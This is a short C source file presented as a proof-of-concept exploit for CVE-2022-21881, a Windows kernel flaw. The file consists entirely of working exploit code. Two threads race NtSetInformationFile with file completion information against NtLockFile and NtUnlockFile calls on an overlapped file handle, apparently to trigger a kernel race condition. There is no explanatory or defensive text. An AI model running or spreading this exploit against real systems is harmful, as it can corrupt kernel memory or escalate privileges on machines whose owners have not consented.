#include <Windows.h>



/*
CVE-2022-21881 POC

Author: theabysslabs


*/


struct FILE_COMPLETION_INFORMATION
{
	HANDLE Port;
	PVOID Key;
};

BYTE io_dummy[0x200];

FILE_COMPLETION_INFORMATION fileInfo = {0};

NTSTATUS (WINAPI* ntLockFile)(HANDLE,HANDLE,ULONG_PTR,PVOID,ULONG_PTR,LARGE_INTEGER*,LARGE_INTEGER*,PULONG,BOOLEAN,BOOLEAN);
NTSTATUS (WINAPI* ntSetInformationFile)(HANDLE,ULONG_PTR,PVOID,ULONG,DWORD);
NTSTATUS (WINAPI* ntUnlockFile)(HANDLE,ULONG_PTR,LARGE_INTEGER*,LARGE_INTEGER*,ULONG);

HANDLE hFile;
LARGE_INTEGER x = {0};
LARGE_INTEGER y = {0};

void thread2()
{
	while(true)
	{
		y.LowPart = 0x1;
		NTSTATUS status = ntLockFile(hFile,0,(ULONG_PTR)1,(PVOID)2,(ULONG_PTR)&io_dummy,&x,&y,0,TRUE,1);

		if(status != 0){
			ntUnlockFile(hFile,(ULONG_PTR)&io_dummy,&x,&y,0);

		}


	};


}

void thread1()
{
	while(true)
	{
	NTSTATUS status = ntSetInformationFile(hFile,(ULONG_PTR)&io_dummy,&fileInfo,sizeof(FILE_COMPLETION_INFORMATION),0x3D);

	if(status != 0)
	{
		CreateIoCompletionPort(hFile,0,0,0);

	}

	};


}


void main()
{

	hFile = CreateFileA("a.bin",GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,0);

	ntLockFile = (NTSTATUS (WINAPI*)(HANDLE,HANDLE,ULONG_PTR,PVOID,ULONG_PTR,LARGE_INTEGER*,LARGE_INTEGER*,PULONG,BOOLEAN,BOOLEAN))GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtLockFile");
	ntSetInformationFile = (NTSTATUS (WINAPI*)(HANDLE,ULONG_PTR,PVOID,ULONG,DWORD))GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtSetInformationFile");
	ntUnlockFile = (NTSTATUS (WINAPI*)(HANDLE,ULONG_PTR,LARGE_INTEGER*,LARGE_INTEGER*,ULONG))GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtUnlockFile");


	CreateIoCompletionPort(hFile,0,0,0);
	CreateThread(0,0,(LPTHREAD_START_ROUTINE)thread1,0,0,0);
	CreateThread(0,0,(LPTHREAD_START_ROUTINE)thread2,0,0,0);

	while(true)
	{
		Sleep(1000);
	}

}
